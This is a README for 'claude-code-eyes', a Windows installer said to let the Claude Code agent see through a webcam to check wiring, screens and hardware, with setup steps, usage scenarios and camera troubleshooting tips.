👁️ claude-code-eyes - Give Claude Code eyes to see hardware

Download for Windows

Claude Code needs to see your physical desk. This tool adds a camera skill to your agent. Use it to check hardware, verify screen panels, or inspect wires before you supply power. The software catches bugs that happen outside of your computer logs.

📋 Requirements

Verify your computer meets these needs before you start:

  • Windows 10 or Windows 11
  • A working USB webcam or built-in camera
  • An existing Claude Code installation
  • A stable internet connection

💾 Getting Started

Follow these steps to set the tool up on your machine.

  1. Visit the repository release page to find the latest version.
  2. Select the file ending in .exe for Windows.
  3. Save the file to your desktop or a folder you can find later.
  4. Double-click the file to start the installer.
  5. Follow the screen prompts to finish the setup process.

🧩 How it works

The software acts as a bridge between your camera and the Claude Code agent. Once you grant permissions, Claude receives images from your webcam. You can ask Claude to "look at the breadboard" or "verify the status light." The agent scans the image data and provides feedback based on what it sees in physical space.

💡 Usage Scenarios

Use this tool for the following tasks:

  • Wiring Checks: Point your camera at your circuit prototype to see if connections match your diagram.
  • Screen Verification: Ask Claude to check if your graphical interface renders correctly on a physical display.
  • Hardware Debugging: Search for loose wires or burnt components that cause system errors.
  • Automated Testing: Set up a camera to watch a home automation device respond to your code changes.

🔧 Troubleshooting

If the camera does not show an image, try these steps:

  • Ensure your camera works in other applications like Zoom or Windows Camera.
  • Check that no other programs use the camera at the same time.
  • Restart the application after you plug in the camera.
  • Check your Windows privacy settings to allow apps to access your camera hardware.
